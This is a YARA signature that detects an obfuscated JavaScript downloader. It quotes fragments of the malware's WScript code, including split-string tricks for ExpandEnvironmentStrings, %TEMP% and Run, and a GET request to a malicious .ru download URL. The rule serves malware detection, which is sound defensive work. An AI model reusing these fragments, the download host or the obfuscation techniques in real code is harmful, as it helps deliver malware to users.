rule sig_20160428_9622928335a6d34a4dc51fcb082c7339 {
  meta:
    description = "datamaliciousorder - file 20160428_9622928335a6d34a4dc51fcb082c7339.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e05c4f5b2a0b71582417aedbf8b4f4522c78127f6be01ee4d32881a38fc2db59"

  strings:
    $s1  = "function VigLxzAjyKyhCweDffCft() {return TbkEpaRdsEmyCboNbdTsw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function ZadBfrCliLigHffSphDza(ShuNjiJhhJjnJukPceToy){TbkEpaRdsEmyCboNbdTsw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function ZadBfrCliLigHffSphDza(ShuNjiJhhJjnJukPceToy){TbkEpaRdsEmyCboNbdTsw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var TbkEpaRdsEmyCboNbdTsw = function SprQzaGfjWwyQliUdnRxy() {return CtbZkfGmbCsxUksMqcVop[EfaObvRkdPuoEidXamMlw](\"WScript\"+\"" ascii
    $s5  = "function SevIyhAinQygHimGizVzo(EedFowRyyVwtTazDrgTjo, LwtEryEjaWeeLydKwgFch){YykSjpFeaSpuObrEeiVkz = YykSjpFeaSpuObrEeiVkz * 1; " ascii
    $s6  = "function DrdZldLlmUepFzfHaxZzd() {return ((BrbEdkWuuGslOfjGaiBga == true) && (BrbEdkWuuGslOfjGaiBga == DyyVxgXhzRinFhpLpgDfm)) ?" ascii
    $s7  = "return EedFowRyyVwtTazDrgTjo - LwtEryEjaWeeLydKwgFch;};" fullword ascii
    $s8  = "function DrdZldLlmUepFzfHaxZzd() {return ((BrbEdkWuuGslOfjGaiBga == true) && (BrbEdkWuuGslOfjGaiBga == DyyVxgXhzRinFhpLpgDfm)) ?" ascii
    $s9  = "KifFmiGcjSyhXkkIbeEux[YfmGirTlaMbjYgmXjyCjg](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s10 = "var CtbZkfGmbCsxUksMqcVop = this[\"WScript\"];" fullword ascii
    $s11 = "var TbkEpaRdsEmyCboNbdTsw = function SprQzaGfjWwyQliUdnRxy() {return CtbZkfGmbCsxUksMqcVop[EfaObvRkdPuoEidXamMlw](\"WScript\"+\"" ascii
    $s12 = "function VigLxzAjyKyhCweDffCft() {return TbkEpaRdsEmyCboNbdTsw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "if (KifFmiGcjSyhXkkIbeEux[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function SevIyhAinQygHimGizVzo(EedFowRyyVwtTazDrgTjo, LwtEryEjaWeeLydKwgFch){YykSjpFeaSpuObrEeiVkz = YykSjpFeaSpuObrEeiVkz * 1; " ascii
    $s15 = "function YguEomUcoTqrWxuVbvGso(){return SgoTaxMhaNnkSjiCigTgj + \"\";};" fullword ascii
    $s16 = "function TvwDjhYxuDmgDooYdyWwq(){return EfaObvRkdPuoEidXamMlw;};" fullword ascii
    $s17 = "XnzDioBhsIblJzrOsbCzb = true;" fullword ascii
    $s18 = "var BrbEdkWuuGslOfjGaiBga = false;" fullword ascii
    $s19 = "var GzfQizNmyOsjIewWsjQex = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function OkhJaaFjrLinVnhIqkXuh(TmwUqkHjhGixDhuTgdRez) {var RrtLqkPohTecNciOouGxo = (1, 2, 3, 4, 5, TmwUqkHjhGixDhuTgdRez); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}